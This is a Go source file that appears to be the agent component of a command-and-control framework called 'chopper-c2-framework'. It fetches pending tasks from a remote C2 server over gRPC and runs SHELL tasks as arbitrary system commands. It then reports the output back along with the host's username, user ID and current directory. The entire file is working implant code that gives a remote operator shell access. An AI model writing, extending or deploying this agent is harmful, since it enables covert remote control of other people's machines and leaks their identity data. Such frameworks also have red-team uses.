package main

import (
	"context"
	"errors"
	"fmt"
	pb "github.com/chopper-c2-framework/c2-chopper/grpc/proto"
	"log"
	"os"
	"os/exec"
	"time"
)

func FetchTasks(services *Services) ([]*pb.Task, uint32, error) {
	fmt.Println("Fetching tasks")
	request := &pb.GetAgentUnexecutedTasksRequest{
		AgentId: info.Uuid,
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	resp, err := services.TaskService.GetAgentUnexecutedTasks(ctx, request)
	if err != nil {
		return nil, 0, err
	}
	return resp.GetTasks(), resp.GetSleepTime(), nil
}

func ExecuteShell(args []string) ([]byte, error) {
	if args == nil || len(args) == 0 {
		return nil, errors.New("no arguments provided")
	}

	cmd := args[0]
	params := args[1:]
	if cmd == "cd" {
		var dir string

		if len(params) == 0 {
			dir = info.HomeDir
		} else {
			dir = params[0]
		}

		err := os.Chdir(dir)
		if err != nil {
			return nil, err
		}

		err = UpdateCwd()
		if err != nil {
			return nil, err
		}
		fmt.Println(info.Cwd)
		return nil, nil
	}

	command := exec.Command(cmd, params...)
	command.Dir = info.Cwd
	out, err := command.Output()
	if err != nil {
		return nil, err
	}

	fmt.Println(string(out))
	return out, nil
}

func HandleShellTask(task *pb.Task) (*pb.TaskResult, error) {
	var (
		status int32 = 200
		output string
	)

	out, err := ExecuteShell(task.GetArgs())
	output = string(out)
	if err != nil {
		log.Println(err)
		status = 500
		output = err.Error()
	}

	return &pb.TaskResult{
		TaskId: task.TaskId,
		Output: output,
		Status: status,
	}, nil
}

func HandlePingTask(task *pb.Task) (*pb.TaskResult, error) {
	return &pb.TaskResult{
		TaskId: task.TaskId,
		Output: "pong",
		Status: 200,
	}, nil
}

func ExecuteTask(task *pb.Task) (*pb.TaskResult, error) {
	// Handle execution & stuff
	fmt.Println("Executing task", task.Name)
	switch task.Type {
	case pb.TaskType_SHELL:
		return HandleShellTask(task)
	case pb.TaskType_PING:
		return HandlePingTask(task)
	}
	return &pb.TaskResult{
		TaskId: task.TaskId,
		Output: "Unknown",
		Status: 404,
	}, nil
}

func SendResult(services *Services, result *pb.TaskResult) error {
	fmt.Println("Sending result for task id", result.TaskId)

	request := &pb.CreateTaskResultRequest{
		TaskResult: result,
		Info: &pb.Agent{
			Id:       info.Uuid,
			Cwd:      info.Cwd,
			Username: info.Username,
			UserId:   info.UserId,
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	_, err := services.TaskService.CreateTaskResult(ctx, request)
	return err
}
